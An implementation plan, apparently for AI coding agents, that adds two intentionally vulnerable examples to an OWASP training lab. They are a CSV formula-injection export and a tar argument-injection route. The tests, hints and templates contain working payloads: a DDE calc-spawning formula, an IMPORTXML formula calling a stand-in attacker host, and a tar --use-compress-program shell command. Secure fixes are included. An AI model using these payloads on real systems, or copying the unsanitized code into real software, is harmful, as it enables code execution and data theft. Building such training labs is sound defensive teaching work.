# CSV Injection & Argument Injection Additions Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 2 new intentionally-vulnerable examples to the OWASP Top 10 Training Lab — a CSV formula-injection example (new "CSV Injection" group) and an argument-injection example (existing "OS Command Injection" group) — both in A03 Injection, bringing the app from 88 to 90 examples and max score from 1830 to 1880.

**Architecture:** Both examples are self-contained additions to A03's existing `routes.py`/`__init__.py`/`templates/`. The CSV example reuses the existing `Comment` model and `/a03/comments` POST endpoint unmodified. The argument-injection example uses only plain module-level constants (a workspace directory path and a fixed proof-file path) — no new SQLAlchemy models anywhere.

**Tech Stack:** Flask, Jinja2, Python's `csv`/`subprocess` standard-library modules, pytest with Flask's test client (no mocking — the argument-injection test must exercise the real `tar` binary).

**Spec:** `docs/superpowers/specs/2026-09-24-owasp-lab-csv-argument-injection-additions-design.md`

## Global Constraints

- No new SQLAlchemy models — the CSV example reuses the existing `Comment` model (`app/categories/a03_injection/models.py:21-26`) unmodified; the argument-injection example uses plain module-level constants only.
- Every `ExampleNav.hints` list has 3-5 entries, each non-empty, no duplicates within the list.
- Within A03's `grouped_examples()` output, every group's examples must be sorted Easy → Medium → Hard.
- Hints render through Jinja's autoescaped `{{ hint }}` expression — write raw, unescaped `<`/`>`/`&` in hint text (Jinja escapes it automatically at render time). The six static template blocks (`explanation`/`detect`/`exploitation`/`tasks`/`vulnerable_code`/`secure_code`/`live_example`) are rendered UNESCAPED (raw HTML written directly in the template source) — any literal `<`/`>`/`&` that must appear as visible TEXT (not real markup) inside those blocks must be manually entity-encoded (`&lt;`/`&gt;`/`&amp;`).
- **The vulnerabilities ARE the deliverable.** Never add sanitization, escaping, validation, authentication, or resource limits to any new vulnerable code path. The CSV export must never add a leading-quote (or any other) neutralization prefix to any cell. The `tar` export must never validate, sanitize, or restrict the `filename` argument in any way, and must never switch away from the exact `subprocess.run([...], shell=False)` invocation shown in this plan.
- **Every `ExampleNav.endpoint` must point at a route that renders an HTML explanation page** (extending `core/example_page_base.html`, with the "mark as done" UI) — never directly at a raw action/download route. This app's nav-link/mark-as-done flow (`app/core/__init__.py` matches `current_example` via `request.endpoint == e.endpoint`) only works correctly when `endpoint` is the explanation page's own route. (Established the hard way in a prior round after a designer — not an implementer — got this wrong for a batch of new examples; see Task 1's explicit two-route design below, which was written correctly the first time specifically to avoid repeating that mistake.)
- New routes follow A03's existing plain `render_template()`/`redirect()`/`jsonify()` convention — no new abstraction layers.

---

### Task 1: A03 CSV Formula Injection

**Files:**
- Modify: `app/categories/a03_injection/routes.py` (add `import csv` and `import io` to the top imports; append two new routes at the end of the file, after the existing `css_exfil_collector()`)
- Modify: `app/categories/a03_injection/__init__.py` (append new `ExampleNav` after the `css-attribute-exfil` entry — the very end of the examples list)
- Create: `app/categories/a03_injection/templates/a03_injection/csv_injection.html`
- Create: `tests/test_a03_csv_injection.py`
- Modify: `tests/test_a03_hints_remaining_groups.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: the existing `Comment` model (`author`, `body` fields) and the existing `a03_injection.comments` POST endpoint (`app/categories/a03_injection/routes.py:137-146`) — do not modify either. `Response`, `render_template`, `request` (already imported).
- Produces: routes `a03_injection.csv_injection` (GET, the HTML explanation page) and `a03_injection.export_comments_csv` (GET, the raw vulnerable CSV download). `ExampleNav` id `csv-formula-injection`, new group `"CSV Injection"` in A03's `CategoryNav` (this task's group is brand new, so its exact position in the flat list doesn't affect any other group's Easy→Hard ordering — appending at the very end is simplest and matches how every prior round has added new groups).

- [ ] **Step 1: Read A03's current routes.py and __init__.py fresh, and the comments.html template**

Before writing anything, read `app/categories/a03_injection/routes.py` in full, `app/categories/a03_injection/__init__.py` in full, and `app/categories/a03_injection/templates/a03_injection/comments.html` (for the exact comment-submission form markup to reuse) to confirm current file state matches what's shown below. If anything has changed, adapt the insertion points accordingly — this plan is accurate as of repo tip `eb9003a`, but always trust the file you actually read over this plan if they've diverged.

- [ ] **Step 2: Write the failing tests**

Create `tests/test_a03_csv_injection.py`:

```python
def test_csv_injection_explanation_page_renders_html(client):
    response = client.get("/a03/csv-injection")
    assert response.status_code == 200
    assert b"CSV Formula Injection" in response.data


def test_csv_export_headers(client):
    response = client.get("/a03/export-comments-csv")
    assert response.status_code == 200
    assert response.mimetype == "text/csv"
    assert response.headers["Content-Disposition"] == "attachment; filename=comments_export.csv"


def test_csv_export_contains_unneutralized_basic_formula_payload(client):
    payload = "=1+1"
    client.post("/a03/comments", data={"author": "Attacker", "body": payload})

    response = client.get("/a03/export-comments-csv")
    body = response.data.decode()
    # the raw, unmodified formula text appears in the CSV -- no leading
    # single-quote or other character was prepended to neutralize it
    assert f",{payload}" in body


def test_csv_export_preserves_dde_calc_spawn_payload_unmodified(client):
    payload = "=cmd|'/C calc'!A0"
    client.post("/a03/comments", data={"author": "Attacker", "body": payload})

    response = client.get("/a03/export-comments-csv")
    body = response.data.decode()
    assert payload in body
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/test_a03_csv_injection.py -v`
Expected: FAIL — `404 NOT FOUND` for `/a03/csv-injection` and `/a03/export-comments-csv` (neither route exists yet).

- [ ] **Step 4: Add imports and the two vulnerable routes**

At the top of `app/categories/a03_injection/routes.py`, change:

```python
import os
import re
import subprocess
import urllib.request
```

to:

```python
import csv
import io
import os
import re
import subprocess
import urllib.request
```

Append these two routes to the end of the file (after the existing `css_exfil_collector()`, which currently ends the file):

```python
@a03_bp.route("/csv-injection")
def csv_injection():
    return render_template("a03_injection/csv_injection.html")


@a03_bp.route("/export-comments-csv")
def export_comments_csv():
    all_comments = Comment.query.order_by(Comment.id.desc()).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Author", "Comment"])
    for c in all_comments:
        # VULNERABLE: no neutralization of leading formula characters
        # (=, +, -, @) before writing user-controlled fields into the CSV --
        # a spreadsheet application that opens this export treats any cell
        # starting with one of those characters as a formula to evaluate,
        # not as literal text.
        writer.writerow([c.author, c.body])
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-Disposition": "attachment; filename=comments_export.csv"},
    )
```

No further new imports are needed — `Response`, `render_template`, `Comment` are already imported at the top of this file.

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/csv_injection.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "CSV Formula Injection via Comment Export" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  Every comment posted on this page can later be exported to a CSV file --
  a common "download this data" feature many real apps offer. The export
  writes each comment's author and body straight into a spreadsheet cell
  with no neutralization at all. Spreadsheet applications like Excel,
  LibreOffice, and Google Sheets treat any cell whose content starts with
  <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a
  formula to evaluate the moment the file is opened, not as literal text --
  an attacker who controls a comment controls what runs on the machine of
  whoever opens the export.
</p>
{% endblock %}

{% block detect %}
<p>
  Post a comment whose body is exactly <code>=1+1</code> below, then
  <a href="{{ url_for('a03_injection.export_comments_csv') }}">download the CSV export</a>
  and open it in a text editor -- the cell contains the literal,
  un-neutralized text <code>=1+1</code>, with no leading quote or other
  prefix added to stop a spreadsheet application from treating it as a
  formula.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Confirm the injection point: post a comment with body
      <code>=1+1</code> and export -- the raw formula text survives
      unmodified into the CSV cell.</li>
  <li>Escalate to code execution via Excel's Dynamic Data Exchange (DDE)
      feature: post a comment with body
      <code>=cmd|'/C calc'!A0</code>. Exported and opened in a
      DDE-enabled version of Excel, this spawns Calculator the moment the
      victim clicks through Excel's "update this workbook with data from
      external sources?" prompt -- the same mechanism a real attacker
      would use to launch a PowerShell download-and-execute payload
      instead.</li>
  <li>Escalate to silent data exfiltration in Google Sheets, which has no
      DDE prompt to click through: post a comment with body
      <code>=IMPORTXML("http://attacker.example/track", "//a/@href")</code>.
      The moment a victim views this cell in Google Sheets, it silently
      issues a real outbound HTTP request to the attacker's server --
      confirming the payload landed, and in a real attack, potentially
      exfiltrating other spreadsheet data back to the attacker through the
      query's return value.</li>
</ol>
<p>
  This lab's test suite proves the export genuinely contains the
  un-neutralized payload byte-for-byte; it can't launch a real copy of
  Excel or Google Sheets to prove the formula executes, exactly like this
  lab's SQL-injection-to-RCE example describes its final reverse-shell
  escalation in prose rather than actually opening one.
</p>
{% endblock %}

{% block vulnerable_code %}writer = csv.writer(output)
writer.writerow(["Author", "Comment"])
for c in all_comments:
    writer.writerow([c.author, c.body])
{% endblock %}

{% block secure_code %}FORMULA_LEAD_CHARS = ("=", "+", "-", "@")

def neutralize(cell):
    if cell and cell[0] in FORMULA_LEAD_CHARS:
        return "'" + cell  # leading quote forces spreadsheet apps to treat it as text
    return cell

writer = csv.writer(output)
writer.writerow(["Author", "Comment"])
for c in all_comments:
    writer.writerow([neutralize(c.author), neutralize(c.body)])
{% endblock %}

{% block live_example %}
<form method="post" action="{{ url_for('a03_injection.comments') }}" class="mb-3">
  <div class="mb-2">
    <label class="form-label">Name</label>
    <input type="text" class="form-control" name="author" value="Guest">
  </div>
  <div class="mb-2">
    <label class="form-label">Comment</label>
    <textarea class="form-control" name="body" rows="2" placeholder="=1+1"></textarea>
  </div>
  <button type="submit" class="btn btn-primary">Post comment</button>
</form>
<p class="text-muted small">
  Posting redirects you to the Comments page (that's the existing route
  this form reuses) -- come back here or just use the link below to
  download the export.
</p>
<a href="{{ url_for('a03_injection.export_comments_csv') }}" class="btn btn-outline-secondary">
  Download CSV Export
</a>
<p class="mt-3">
  <a href="{{ url_for('a03_injection.comments') }}">View posted comments</a>
</p>
{% endblock %}
```

- [ ] **Step 6: Register the ExampleNav entry**

In `app/categories/a03_injection/__init__.py`, insert this new `ExampleNav` immediately after the `css-attribute-exfil` entry's closing `),` and before the list's closing `],` (this is the very last entry in the file — see the Orchestration Note below for how this composes with Task 2's insertion elsewhere in the same list):

```python
            ExampleNav(
                id="csv-formula-injection",
                title="CSV Formula Injection via Comment Export",
                group="CSV Injection",
                difficulty="Medium",
                endpoint="a03_injection.csv_injection",
                hints=[
                    "This comment feature can export all comments to a CSV file for download -- a common real-world feature. Look at how each comment's author and body get written into that export: is there any check on what characters a cell is allowed to start with?",
                    "Spreadsheet applications like Excel and Google Sheets treat a cell starting with =, +, -, or @ as a FORMULA to evaluate the instant the file is opened, not as plain text. Post a comment with body =1+1, export the CSV, and open the raw file -- the cell contains the literal text =1+1 with no neutralizing prefix added.",
                    "Escalate from a harmless proof to real code execution: post a comment with body =cmd|'/C calc'!A0 (a Dynamic Data Exchange payload). Opened in a DDE-enabled version of Excel, this spawns Calculator the moment the victim accepts the workbook's external-data-update prompt.",
                    "Google Sheets has no such prompt to click through. Post a comment with body =IMPORTXML(\"http://attacker.example/track\", \"//a/@href\") -- viewing this cell in Google Sheets silently fires a real outbound HTTP request to the attacker's server, confirming the payload landed with zero user interaction beyond opening the file.",
                ],
            ),
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `pytest tests/test_a03_csv_injection.py -v`
Expected: PASS (all 4 tests).

- [ ] **Step 8: Update A03's cross-cutting test files**

In `tests/test_a03_hints_remaining_groups.py`, add `"csv-formula-injection"` to the end of `REMAINING_GROUP_IDS`:

```python
REMAINING_GROUP_IDS = [
    "reflected-xss",
    "stored-xss",
    "filter-challenge",
    "filtered-host-lookup",
    "command-injection",
    "blind-report-injection",
    "xml-import",
    "xxe-ssrf",
    "ssti-email-preview",
    "ssti-blacklist-bypass",
    "ldap-directory-login",
    "ldap-directory-search",
    "css-attribute-exfil",
    "csv-formula-injection",
]
```

In `tests/test_a03_overview.py`, change the difficulty list in `test_a03_registered_in_nav` — append `"Medium"` as the 21st entry (this task's example is the LAST one in A03's flat list, so it's the last entry in this array regardless of whether Task 2 has landed yet — if Task 2 has already landed when you do this step, there will be 22 entries with `"Medium"` last; if Task 2 hasn't landed yet, there will be 21 entries with `"Medium"` last — check the actual current list length and adapt, but "Medium" as the final entry is correct either way since this example is always appended at the very end):

```python
    assert [e.difficulty for e in a03.examples] == [
        # ... existing entries unchanged ...
        "Medium",  # csv-formula-injection, always the last entry
    ]
```

Change `test_a03_examples_grouped_by_vulnerability_subtype` — append `"CSV Injection"` as the last group name, and add a new assertion for its single member as the last group-membership assertion:

```python
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
        "Server-Side Template Injection (SSTI)",
        "LDAP Injection",
        "CSS Injection",
        "CSV Injection",
    ]
    # ... existing grouped[0][1] through grouped[6][1] assertions unchanged ...
    assert [e.id for e in grouped[7][1]] == ["csv-formula-injection"]
```

(the trailing `difficulty_rank` sortedness loop needs no change)

- [ ] **Step 9: Run the full A03 test surface**

Run: `pytest tests/test_a03_csv_injection.py tests/test_a03_hints_remaining_groups.py tests/test_a03_hints_sqli_group.py tests/test_a03_overview.py -v`
Expected: PASS (all tests, no regressions in existing A03 examples).

- [ ] **Step 10: Commit**

```bash
git add app/categories/a03_injection/routes.py \
        app/categories/a03_injection/__init__.py \
        app/categories/a03_injection/templates/a03_injection/csv_injection.html \
        tests/test_a03_csv_injection.py \
        tests/test_a03_hints_remaining_groups.py \
        tests/test_a03_overview.py
git commit -m "feat(a03): add CSV Formula Injection via Comment Export example"
```

---

### Task 2: A03 Argument Injection via tar Archive Export

**Files:**
- Modify: `app/categories/a03_injection/routes.py` (add `ARCHIVE_EXPORT_DIR` and `ARGUMENT_INJECTION_PROOF_PATH` constants near the top, alongside the existing `ACCOUNT_RECOVERY_PIN`/`CSS_EXFIL_LOG_PATH` constants; append one new route at the end of the file, after Task 1's `export_comments_csv()`)
- Modify: `app/categories/a03_injection/__init__.py` (insert new `ExampleNav` immediately after the existing `blind-report-injection` entry — inside the "OS Command Injection" group, NOT at the end of the file)
- Create: `app/categories/a03_injection/templates/a03_injection/export_archive.html`
- Create: `tests/test_a03_argument_injection.py`
- Modify: `tests/test_a03_hints_remaining_groups.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: `a03_bp`, `subprocess`, `os`, `render_template`, `request` (all already imported/available after Task 1 lands).
- Produces: route `a03_injection.export_archive` (GET/POST, both the explanation page AND the live demo — this example uses ONE combined route, matching the existing single-route pattern of `host_lookup`/`filtered_host_lookup`/`generate_report`/`theme_preview`, since unlike Task 1 there is no separate "raw download" resource here — the whole exploit IS the one archive-export action with visible output). Module-level constants `ARCHIVE_EXPORT_DIR` and `ARGUMENT_INJECTION_PROOF_PATH`. `ExampleNav` id `argument-injection-tar-export`, inserted as the 4th member of the EXISTING "OS Command Injection" group.

## Orchestration Note (read before starting Task 2)

Task 1 and Task 2 both modify `app/categories/a03_injection/routes.py` and `app/categories/a03_injection/__init__.py`, sequentially. By the time Task 2 starts, Task 1 has already:
- Added `import csv` / `import io` to `routes.py`'s top imports.
- Appended `csv_injection()` and `export_comments_csv()` to the END of `routes.py`.
- Appended the `csv-formula-injection` `ExampleNav` entry to the very END of `__init__.py`'s examples list (after `css-attribute-exfil`).

**Task 2's insertion points do not physically overlap with Task 1's** — Task 2 inserts its new constants near the TOP of `routes.py` (alongside the other constants) and its new route at the END of `routes.py` (after Task 1's two new routes, since routes are appended in registration order throughout this file), and its `ExampleNav` entry goes in the MIDDLE of `__init__.py` (right after `blind-report-injection`, well before Task 1's entry at the very end). Even so, **re-read both files fresh before editing** — don't assume line numbers from this plan still match exactly.

**The fully-composed final A03 example order, after both tasks have landed** (worked out by hand so both tasks' insertion instructions are verified mutually consistent):

| # | id | group | difficulty |
|---|---|---|---|
| 1-7 | (SQL Injection group, unchanged) | SQL Injection | E,M,M,M,H,H,H |
| 8-10 | (XSS group, unchanged) | Cross-Site Scripting (XSS) | M,H,H |
| 11 | filtered-host-lookup | OS Command Injection | Medium |
| 12 | command-injection | OS Command Injection | Hard |
| 13 | blind-report-injection | OS Command Injection | Hard |
| 14 | **argument-injection-tar-export** (Task 2) | OS Command Injection | **Hard** |
| 15 | xml-import | XML External Entity Injection (XXE) | Easy |
| 16 | xxe-ssrf | XML External Entity Injection (XXE) | Hard |
| 17 | ssti-email-preview | Server-Side Template Injection (SSTI) | Easy |
| 18 | ssti-blacklist-bypass | Server-Side Template Injection (SSTI) | Hard |
| 19 | ldap-directory-login | LDAP Injection | Easy |
| 20 | ldap-directory-search | LDAP Injection | Hard |
| 21 | css-attribute-exfil | CSS Injection | Hard |
| 22 | **csv-formula-injection** (Task 1) | **CSV Injection** | **Medium** |

Final groups (8 total, first-occurrence order): SQL Injection, Cross-Site Scripting (XSS), OS Command Injection (now 4 members), XML External Entity Injection (XXE), Server-Side Template Injection (SSTI), LDAP Injection, CSS Injection, CSV Injection.

Full difficulty list (22 entries): `Easy, Medium, Medium, Medium, Hard, Hard, Hard, Medium, Hard, Hard, Medium, Hard, Hard, Hard, Easy, Hard, Easy, Hard, Easy, Hard, Hard, Medium`

This exact list and group breakdown is what Task 3 will use for its own final sanity check — if either task's actual landed state produces something different from this table, treat this table as wrong and the actual registered state as authoritative (matching this plan's own Global Constraints spirit), but flag the discrepancy loudly since it likely means one task's insertion instructions were misapplied.

- [ ] **Step 1: Read A03's current routes.py and __init__.py fresh (after Task 1 has landed)**

Read both files in full. Locate the `blind-report-injection` `ExampleNav` entry in `__init__.py` — Task 2's new entry goes immediately after its closing `),` and before the next entry (`xml-import`). Locate the end of `routes.py` (after Task 1's `export_comments_csv()`) for where to append the new route.

- [ ] **Step 2: Write the failing tests**

Create `tests/test_a03_argument_injection.py`:

```python
import os

import pytest

from app.categories.a03_injection.routes import ARGUMENT_INJECTION_PROOF_PATH


@pytest.fixture(autouse=True)
def _clean_proof_file():
    if os.path.exists(ARGUMENT_INJECTION_PROOF_PATH):
        os.remove(ARGUMENT_INJECTION_PROOF_PATH)
    yield
    if os.path.exists(ARGUMENT_INJECTION_PROOF_PATH):
        os.remove(ARGUMENT_INJECTION_PROOF_PATH)


def test_export_archive_page_renders(client):
    response = client.get("/a03/export-archive")
    assert response.status_code == 200
    assert b"Argument Injection" in response.data


def test_ordinary_filename_creates_archive_without_injection(client):
    response = client.post("/a03/export-archive", data={"filename": "notes.txt"})
    assert response.status_code == 200
    assert "uid=" not in response.data.decode()
    assert not os.path.exists(ARGUMENT_INJECTION_PROOF_PATH)


def test_argument_injection_via_use_compress_program_executes_real_command(client):
    payload = '--use-compress-program=sh -c "id > /tmp/a03_argument_injection_proof.txt"'

    response = client.post("/a03/export-archive", data={"filename": payload})
    assert response.status_code == 200

    # the injected command genuinely executed on the real filesystem --
    # not merely that the route accepted the input without erroring
    assert os.path.exists(ARGUMENT_INJECTION_PROOF_PATH)
    with open(ARGUMENT_INJECTION_PROOF_PATH) as f:
        proof_content = f.read()
    assert "uid=" in proof_content

    body = response.data.decode()
    assert "uid=" in body
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/test_a03_argument_injection.py -v`
Expected: FAIL — `404 NOT FOUND` for `/a03/export-archive` (route doesn't exist yet).

- [ ] **Step 4: Add constants and the vulnerable route**

Near the top of `app/categories/a03_injection/routes.py`, alongside the existing `ACCOUNT_RECOVERY_PIN`/`CSS_EXFIL_LOG_PATH` constants, add:

```python
ARCHIVE_EXPORT_DIR = os.path.join(BASE_DIR, "instance", "a03_archive_export")
ARGUMENT_INJECTION_PROOF_PATH = "/tmp/a03_argument_injection_proof.txt"
```

Append this route to the end of the file (after Task 1's `export_comments_csv()`, which will then be the file's last function):

```python
@a03_bp.route("/export-archive", methods=["GET", "POST"])
def export_archive():
    filename = ""
    output = None
    error = None
    proof = None
    if request.method == "POST":
        filename = request.form.get("filename", "")
        os.makedirs(ARCHIVE_EXPORT_DIR, exist_ok=True)
        sample_path = os.path.join(ARCHIVE_EXPORT_DIR, "notes.txt")
        with open(sample_path, "w") as f:
            f.write("export placeholder\n")
        archive_path = os.path.join(ARCHIVE_EXPORT_DIR, "export.tar")
        try:
            # VULNERABLE: shell=False and the list-argument form genuinely
            # block every shell-metacharacter technique this lab's other
            # command-injection examples rely on -- but `filename` is still
            # passed straight through as a single, unvalidated argv element.
            # GNU tar treats any value starting with "--" as a long option,
            # not a filename, no matter how it arrived in argv.
            result = subprocess.run(
                ["tar", "-cf", archive_path, filename],
                shell=False,
                cwd=ARCHIVE_EXPORT_DIR,
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = result.stdout + result.stderr
        except Exception as e:
            error = str(e)
        if os.path.exists(ARGUMENT_INJECTION_PROOF_PATH):
            with open(ARGUMENT_INJECTION_PROOF_PATH) as f:
                proof = f.read()
    return render_template(
        "a03_injection/export_archive.html",
        filename=filename,
        output=output,
        error=error,
        proof=proof,
    )
```

No new imports are needed — `subprocess`, `os`, `render_template`, `request` are already imported at the top of this file.

Note: if a prior test run or manual session left a stale proof file in place, an ordinary (non-malicious) filename submission will still display that stale proof, since this route doesn't clear it between submissions. This is expected, harmless behavior for a training lab (matching the same "state persists until the lab is reset" pattern this app's other stateful examples already use, e.g. `stored-xss`'s comments) — not a defect to fix.

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/export_archive.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Argument Injection via Unsanitized tar Archive Export" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "back up your files" feature invokes <code>tar</code> using Python's
  list-argument form of <code>subprocess.run()</code> with
  <code>shell=False</code> -- the fix this lab's OTHER command-injection
  examples all point to as the correct defense. It genuinely works as
  advertised: no semicolon, pipe, backtick, or newline in the
  <code>filename</code> field reaches a shell, because there IS no shell in
  this call path. But <code>shell=False</code> only stops shell
  metacharacters from being interpreted -- it does nothing to stop the raw
  value itself from being interpreted as something other than a filename by
  the program it's handed to.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit a filename starting with two dashes, like <code>--help</code>.
  GNU <code>tar</code> parses any argument beginning with <code>--</code>
  as a long option, not a file to archive -- regardless of whether that
  value arrived via a shell command line or, as here, directly as one
  element of a Python list passed to <code>subprocess.run()</code>.
</p>
{% endblock %}

{% block exploitation %}
<p>
  GNU tar has a long-documented option, <code>--use-compress-program</code>,
  that lets you specify an arbitrary external program to pipe the archive
  through as a "compressor" -- and tar genuinely executes whatever program
  string you give it. Submit this exact filename:
</p>
<pre>--use-compress-program=sh -c "id > /tmp/a03_argument_injection_proof.txt"</pre>
<p>
  Tar parses this as a single option (everything after the first
  <code>=</code> is the option's value, spaces included, since it all
  arrived as one argv element) and, when it tries to create the archive,
  runs that entire string as its compressor program -- which spawns a real
  shell that executes <code>id</code> and redirects its output to a fixed
  file. Reload this page and the proof file's contents appear below,
  showing the actual output of a command that was never supposed to be
  reachable through this "filename" field at all.
</p>
<p>
  This is a real, cataloged technique -- GNU tar's
  <code>--use-compress-program</code> is one of dozens of argument-injection
  vectors documented across common CLI tools (curl's <code>-o</code>,
  ssh's <code>-oProxyCommand</code>, psql's <code>-o</code>, and many
  others), all sharing the same root cause this example demonstrates:
  avoiding <code>shell=True</code> stops shell-metacharacter injection, but
  it is not, by itself, input validation.
</p>
{% endblock %}

{% block vulnerable_code %}filename = request.form.get("filename", "")
result = subprocess.run(
    ["tar", "-cf", archive_path, filename],
    shell=False,
    cwd=ARCHIVE_EXPORT_DIR,
    capture_output=True,
    text=True,
    timeout=10,
)
{% endblock %}

{% block secure_code %}filename = request.form.get("filename", "")
# Reject any value tar could interpret as an option instead of a filename --
# a leading "-" is exactly what triggers option-parsing in GNU tar (and
# in most other CLI tools' argument parsers):
if filename.startswith("-"):
    abort(400, "Invalid filename")
result = subprocess.run(
    ["tar", "-cf", archive_path, "--", filename],  # "--" also ends option parsing
    shell=False,
    cwd=ARCHIVE_EXPORT_DIR,
    capture_output=True,
    text=True,
    timeout=10,
)
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Filename to back up</label>
    <input type="text" class="form-control" name="filename" value="{{ filename }}" placeholder="notes.txt">
  </div>
  <button type="submit" class="btn btn-primary">Create backup archive</button>
</form>
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% if output %}
<p class="mt-3 mb-1">tar output:</p>
<pre>{{ output }}</pre>
{% endif %}
{% if proof %}
<p class="mt-3 mb-1">Proof-of-execution file (<code>/tmp/a03_argument_injection_proof.txt</code>):</p>
<pre>{{ proof }}</pre>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Register the ExampleNav entry**

In `app/categories/a03_injection/__init__.py`, insert this new `ExampleNav` immediately after the `blind-report-injection` entry's closing `),` and before the `xml-import` entry (see the Orchestration Note above for why this specific position, and the fully-composed final order it produces):

```python
            ExampleNav(
                id="argument-injection-tar-export",
                title="Argument Injection via Unsanitized tar Archive Export",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.export_archive",
                hints=[
                    "This 'back up your files' feature calls tar with shell=False and the list-argument form of subprocess.run() -- the exact fix this lab's OTHER command-injection examples point to. No shell metacharacter reaches a shell here. So what's left to attack?",
                    "shell=False stops shell METACHARACTERS from being interpreted -- it does nothing to validate the raw VALUE itself. Submit a filename starting with -- (e.g. --help) and see whether tar treats it as an option instead of a filename, even though it arrived as one plain Python list element with no shell involved at all.",
                    "GNU tar's --use-compress-program option lets you specify an arbitrary external program to run as the archive's 'compressor' -- and tar genuinely executes whatever string you give it. Submit exactly: --use-compress-program=sh -c \"id > /tmp/a03_argument_injection_proof.txt\"",
                    "Reload the page after submitting that filename -- the proof file's real contents (the actual output of id, executed on the server) appear on the page, proving genuine code execution through a field that was only ever supposed to accept a plain filename.",
                    "This isn't tar-specific: SonarSource's argument-injection-vectors catalog documents the same root cause across curl's -o, ssh's -oProxyCommand, psql's -o, and many other common CLI tools. Avoiding shell=True is necessary but never sufficient on its own -- every argument still needs its own validation.",
                ],
            ),
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `pytest tests/test_a03_argument_injection.py -v`
Expected: PASS (all 3 tests).

- [ ] **Step 8: Update A03's cross-cutting test files**

In `tests/test_a03_hints_remaining_groups.py`, add `"argument-injection-tar-export"` to `REMAINING_GROUP_IDS` — insert it right after `"blind-report-injection"` (matching the same relative position as in `__init__.py`, though the list's own order doesn't have to match `__init__.py`'s exactly — appending anywhere in the list is functionally fine, but matching position keeps the two files easy to cross-reference):

```python
REMAINING_GROUP_IDS = [
    "reflected-xss",
    "stored-xss",
    "filter-challenge",
    "filtered-host-lookup",
    "command-injection",
    "blind-report-injection",
    "argument-injection-tar-export",
    "xml-import",
    "xxe-ssrf",
    "ssti-email-preview",
    "ssti-blacklist-bypass",
    "ldap-directory-login",
    "ldap-directory-search",
    "css-attribute-exfil",
    "csv-formula-injection",
]
```

(if Task 1 already added `"csv-formula-injection"` to the end of this list, keep it there — this task only inserts its own id in the middle, matching the table above)

In `tests/test_a03_overview.py`, update to match the Orchestration Note's fully-composed table exactly:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Hard",
        "Medium",
    ]
```

```python
    assert [e.id for e in grouped[2][1]] == [
        "filtered-host-lookup",
        "command-injection",
        "blind-report-injection",
        "argument-injection-tar-export",
    ]
```

(the group-name list itself, `grouped[0][1]` through `grouped[1][1]`, and `grouped[3][1]` onward through `grouped[7][1]` need no further change beyond what Task 1 already did — only `grouped[2][1]`, the "OS Command Injection" group's membership, gains this task's new id)

- [ ] **Step 9: Run the full A03 test surface**

Run: `pytest tests/test_a03_argument_injection.py tests/test_a03_csv_injection.py tests/test_a03_hints_remaining_groups.py tests/test_a03_hints_sqli_group.py tests/test_a03_overview.py -v`
Expected: PASS (all tests, no regressions in existing A03 examples, including Task 1's).

- [ ] **Step 10: Commit**

```bash
git add app/categories/a03_injection/routes.py \
        app/categories/a03_injection/__init__.py \
        app/categories/a03_injection/templates/a03_injection/export_archive.html \
        tests/test_a03_argument_injection.py \
        tests/test_a03_hints_remaining_groups.py \
        tests/test_a03_overview.py
git commit -m "feat(a03): add Argument Injection via Unsanitized tar Archive Export example"
```

---

### Task 3: Final Integration

**Files:**
- Modify: `tests/test_all_examples_have_hints.py`
- Modify: `tests/test_hints.py`
- Modify: `README.md`

**Interfaces:**
- Consumes: the final state of A03 after Tasks 1 and 2 — 90 total examples across all categories, max score 1880.
- Produces: nothing further downstream; this is the plan's last task.

- [ ] **Step 1: Confirm the actual current totals**

Before editing anything, run:

```bash
python3 -c "
from app import create_app
from app.core.nav import CATEGORIES
app = create_app()
with app.app_context():
    total = sum(len(c.examples) for c in CATEGORIES)
    print('total examples:', total)
"
```

Expected: `total examples: 90` (88 + Task 1's 1 + Task 2's 1). If this doesn't read 90, stop and investigate before proceeding — it means Task 1 or Task 2 didn't land as expected.

- [ ] **Step 2: Update the cross-cutting count assertion**

In `tests/test_all_examples_have_hints.py`, change:
```python
    assert total == 88
```
to:
```python
    assert total == 90
```

- [ ] **Step 3: Update the max-score assertions**

In `tests/test_hints.py`, there are two occurrences of `1830` to change to `1880`:
```python
    assert "Score: 10 / 1880 points" in body
```
and:
```python
    assert b"Score: 10 / 1880" in response.data
```

- [ ] **Step 4: Update README.md's intro paragraph**

Find the A03 parenthetical, currently:
```
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
